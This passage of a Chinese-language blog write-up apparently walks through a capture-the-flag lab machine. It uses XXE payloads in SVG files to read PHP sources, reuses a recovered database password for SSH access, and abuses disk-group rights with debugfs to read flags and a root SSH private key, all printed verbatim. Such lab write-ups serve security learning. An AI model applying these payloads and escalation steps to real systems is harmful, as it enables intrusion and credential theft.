+<div class="highlight highlight-text-xml"><pre class="notranslate">&lt;?<span class="pl-ent">xml</span><span class="pl-e"> version</span>=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span><span class="pl-e"> standalone</span>=<span class="pl-s"><span class="pl-pds">"</span>yes<span class="pl-pds">"</span></span>?&gt;
+&lt;!<span class="pl-ent">DOCTYPE</span> <span class="pl-e">test</span> [ &lt;!<span class="pl-k">ENTITY</span> <span class="pl-c1">xxe</span><span class="pl-k"> SYSTEM </span><span class="pl-s"><span class="pl-pds">"</span>php://filter/convert.base64-encode/resource=/var/www/blog/admin/index.php<span class="pl-pds">"</span></span> &gt; ]&gt;
+&lt;<span class="pl-ent">svg</span> <span class="pl-e">width</span>=<span class="pl-s"><span class="pl-pds">"</span>500px<span class="pl-pds">"</span></span> <span class="pl-e">height</span>=<span class="pl-s"><span class="pl-pds">"</span>2000px<span class="pl-pds">"</span></span> <span class="pl-e">xmlns</span>=<span class="pl-s"><span class="pl-pds">"</span>http://www.w3.org/2000/svg<span class="pl-pds">"</span></span>&gt;
+   &lt;<span class="pl-ent">text</span> <span class="pl-e">font-size</span>=<span class="pl-s"><span class="pl-pds">"</span>10<span class="pl-pds">"</span></span> <span class="pl-e">x</span>=<span class="pl-s"><span class="pl-pds">"</span>0<span class="pl-pds">"</span></span> <span class="pl-e">y</span>=<span class="pl-s"><span class="pl-pds">"</span>20<span class="pl-pds">"</span></span>&gt;<span class="pl-c1">&amp;xxe;</span>&lt;/<span class="pl-ent">text</span>&gt;
+&lt;/<span class="pl-ent">svg</span>&gt;</pre></div>
+<p>看了一下，数据库密码在db.php，我们看一下数据库密码，看他有没有密码复用</p>
+<h2>4.4. 数据库凭证获取</h2>
+<div class="highlight highlight-text-xml"><pre class="notranslate">&lt;?<span class="pl-ent">xml</span><span class="pl-e"> version</span>=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span><span class="pl-e"> standalone</span>=<span class="pl-s"><span class="pl-pds">"</span>yes<span class="pl-pds">"</span></span>?&gt;
+&lt;!<span class="pl-ent">DOCTYPE</span> <span class="pl-e">test</span> [ &lt;!<span class="pl-k">ENTITY</span> <span class="pl-c1">xxe</span><span class="pl-k"> SYSTEM </span><span class="pl-s"><span class="pl-pds">"</span>php://filter/convert.base64-encode/resource=/var/www/blog/admin/db.php<span class="pl-pds">"</span></span> &gt; ]&gt;
+&lt;<span class="pl-ent">svg</span> <span class="pl-e">width</span>=<span class="pl-s"><span class="pl-pds">"</span>500px<span class="pl-pds">"</span></span> <span class="pl-e">height</span>=<span class="pl-s"><span class="pl-pds">"</span>2000px<span class="pl-pds">"</span></span> <span class="pl-e">xmlns</span>=<span class="pl-s"><span class="pl-pds">"</span>http://www.w3.org/2000/svg<span class="pl-pds">"</span></span>&gt;
+   &lt;<span class="pl-ent">text</span> <span class="pl-e">font-size</span>=<span class="pl-s"><span class="pl-pds">"</span>10<span class="pl-pds">"</span></span> <span class="pl-e">x</span>=<span class="pl-s"><span class="pl-pds">"</span>0<span class="pl-pds">"</span></span> <span class="pl-e">y</span>=<span class="pl-s"><span class="pl-pds">"</span>20<span class="pl-pds">"</span></span>&gt;<span class="pl-c1">&amp;xxe;</span>&lt;/<span class="pl-ent">text</span>&gt;
+&lt;/<span class="pl-ent">svg</span>&gt;</pre></div>
+<p>解出</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-ent">&lt;?php</span>
+<span class="pl-s1"><span class="pl-c1">$</span>host</span> = <span class="pl-s">"<span class="pl-s">localhost</span>"</span>;
+<span class="pl-s1"><span class="pl-c1">$</span>db</span> = <span class="pl-s">"<span class="pl-s">blog</span>"</span>;
+<span class="pl-s1"><span class="pl-c1">$</span>user</span> = <span class="pl-s">"<span class="pl-s">root</span>"</span>;
+<span class="pl-s1"><span class="pl-c1">$</span>pass</span> = <span class="pl-s">"<span class="pl-s">pjtF0533OPiSMQTGZacZY6jy$</span>"</span>;
+
+<span class="pl-s1"><span class="pl-c1">$</span>conn</span> = <span class="pl-k">new</span> <span class="pl-v">mysqli</span>(<span class="pl-s1"><span class="pl-c1">$</span>host</span>, <span class="pl-s1"><span class="pl-c1">$</span>user</span>, <span class="pl-s1"><span class="pl-c1">$</span>pass</span>, <span class="pl-s1"><span class="pl-c1">$</span>db</span>);
+<span class="pl-k">if</span> (<span class="pl-s1"><span class="pl-c1">$</span>conn</span>-&gt;<span class="pl-c1">connect_error</span>) {
+    <span class="pl-en">die</span>(<span class="pl-s">"<span class="pl-s">Conexión fallida: </span>"</span> . <span class="pl-s1"><span class="pl-c1">$</span>conn</span>-&gt;<span class="pl-c1">connect_error</span>);
+}</pre></div>
+<h1>5. SSH登录与权限提升</h1>
+<h2>5.1. 密码复用测试</h2>
+<p>测试一下                 <em>做一下白日梦:)</em></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ssh root@192.168.205.132                                                          
+root@192.168.205.132<span class="pl-s"><span class="pl-pds">'</span>s password: </span>
+<span class="pl-s">Permission denied, please try again.</span>
+<span class="pl-s">root@192.168.205.132<span class="pl-pds">'</span></span>s password: 
+  
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ssh ethan@192.168.205.132
+ethan@192.168.205.132<span class="pl-s"><span class="pl-pds">'</span>s password: </span>
+<span class="pl-s">Linux photographer 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64</span>
+<span class="pl-s">⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠶⣞⡩⠽⢷⣆⣀⠀⠀⠀⠀⠀⠀</span>
+<span class="pl-s">⠀⠀⠀⠀⠀⠀⢀⣀⡤⢿⠀⢹⠖⠒⡛⠧⠐⠉⣧⠀⠀⠀⠀</span>
+<span class="pl-s">⠀⢀⡠⠴⣲⣭⡁⠲⠇⢈⡑⢚⠪⠭⠤⠤⢄⣀⣿⠀⠀⠀⠀</span>
+<span class="pl-s">⢠⠃⠤⠄⠉⠉⠀⠐⠉⣡⠞⠁⢀⡴⠞⠉⢉⣩⠿⠶⣄⠀</span>
+<span class="pl-s">⢸⠀⠀⠀⠀⡄⠀⠀⣰⠃⠀⢠⡞⠀⠀⡴⢋⣴⣿⣿⣷⡘⣆</span>
+<span class="pl-s">⢸⠀⠀⠀⠀⡇⠀⠀⡏⠀⠀⣾⠀⠀⡜⢀⣾⣿⣤⣾⣿⡇⣿</span>
+<span class="pl-s">⢨⠀⠀⠀⠀⡇⠀⠀⣇⠀⠀⡏⠀⠀⡇⢸⣿⣿⣿⣿⣿⢁⡏</span>
+<span class="pl-s">⠈⠀⣀⠀⠀⣷⠀⠀⠘⢄⠀⢳⠀⠀⡇⠸⣿⣿⣹⡿⢃⡼⠁</span>
+<span class="pl-s">⢰⡀⠛⠓⠀⢻⠀⠀⠀⠀⢙⣻⡷⠦⣼⣦⣈⣉⣡⡴⠚⠀⠀</span>
+<span class="pl-s">⠀⢷⣄⡀⠀⠀⠀⢀⡠⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀</span>
+<span class="pl-s">⠀⠀⠉⠛⠓⠒⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Photographer</span>
+<span class="pl-s"></span>
+<span class="pl-s">Last login: Tue Oct 28 19:47:04 2025 from 192.168.1.17</span>
+<span class="pl-s">ethan@photographer:~$ id</span>
+<span class="pl-s">uid=1001(ethan) gid=1001(ethan) grupos=1001(ethan),6(disk)</span></pre></div>
+<p>一眼丁真，<code class="notranslate">6(disk)</code>可以直接读东西</p>
+<h2>5.2. disk组权限利用</h2>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ethan@photographer:<span class="pl-k">~</span>$ df -h
+S.ficheros     Tamaño Usados  Disp Uso% Montado en
+udev             965M      0  965M   0% /dev
+tmpfs            197M   552K  197M   1% /run
+/dev/sda1         19G   2,6G   16G  15% /
+tmpfs            984M      0  984M   0% /dev/shm
+tmpfs            5,0M      0  5,0M   0% /run/lock
+tmpfs            197M      0  197M   0% /run/user/1001
+ethan@photographer:<span class="pl-k">~</span>$ debugfs /dev/sda1
+-bash: debugfs: orden no encontrada
+ethan@photographer:<span class="pl-k">~</span>$ which debugfs
+ethan@photographer:<span class="pl-k">~</span>$ find / -name <span class="pl-s"><span class="pl-pds">'</span>debugfs<span class="pl-pds">'</span></span> <span class="pl-k">2&gt;</span>/dev/null
+/usr/sbin/debugfs</pre></div>
+<h2>5.3. Flag获取</h2>
+<p>藏起来了</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">debugfs:  cat /root/root.txt
+dc54639c5bd88637cc23dd7dd1827bbf
+debugfs:  cat /home/ethan/user.txt
+3fd75fcad59cce5c0bbb0f1a52b04ebd
+debugfs:  cat /root/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+wyij4+RkfxUm0AAAALcm9vdEBkZWJpYW4=
+-----END OPENSSH PRIVATE KEY-----</pre></div></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
